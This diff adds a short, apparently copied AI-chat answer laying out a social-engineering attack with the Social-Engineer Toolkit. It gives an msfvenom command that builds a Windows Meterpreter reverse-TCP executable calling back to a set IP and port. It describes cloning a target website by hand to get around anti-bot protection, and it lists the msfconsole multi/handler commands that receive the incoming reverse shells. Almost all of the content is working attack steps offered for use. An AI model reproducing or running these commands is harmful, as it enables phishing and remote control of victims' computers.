@@ -1,0 +1,12 @@
+1. Social-Engineer Toolkit (SET) & Web DeliveryManual Payload GenerationGenerate a standard Windows executable reverse TCP payload using msfvenom:bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=4444 -f exe -o /tmp/iambad.exe
+
+Use code with caution
+.Static Page Cloner & Custom Import BypassModern sites use anti-bot telemetry that prevents automated command-line cloning via SET (Error: Unable to clone site). Use the manual Custom Import method instead:Open the target site in your browser -> Press Ctrl + S -> Save as Webpage, HTML Only -> Name it exactly index.html.Move the file into a dedicated folder (e.g., /tmp/mysite/index.html).In SET: Choose 3) Custom Import and point it to the folder path /tmp/mysite/.Setting Up the Independent Multi-Handler ListenerBecause manual payloads bypass SET's background generation wizard, you must handle incoming reverse shell links manually via msfconsole:bash
+
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.103
+set LPORT 4444
+exploit
